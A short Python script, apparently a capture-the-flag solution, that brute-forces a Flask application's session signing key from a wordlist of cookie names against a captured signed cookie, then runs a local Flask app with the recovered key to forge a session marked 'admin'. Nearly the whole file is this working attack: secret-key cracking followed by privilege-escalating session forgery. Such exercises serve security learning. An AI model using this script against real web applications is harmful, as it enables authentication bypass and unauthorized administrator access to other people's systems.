from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
def decode_flask_cookie(secret_key, cookie_str):
    import hashlib
    from itsdangerous import URLSafeTimedSerializer
    from flask.sessions import TaggedJSONSerializer
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.loads(cookie_str)

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]


def get_secret_key():
    for i in range(len(cookie_names)):
        try:
            data = decode_flask_cookie(cookie_names[i],
                                       'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.YkqLbA.nLiX93uYGSyoDhWzBUJpl-OKyAY')
            print('key is', cookie_names[i])
            return cookie_names[i]
        except:
            pass

app = Flask(__name__)
app.secret_key = get_secret_key()

@app.route("/")
def main():
    session["very_auth"] = 'admin'
    return "1"

app.run()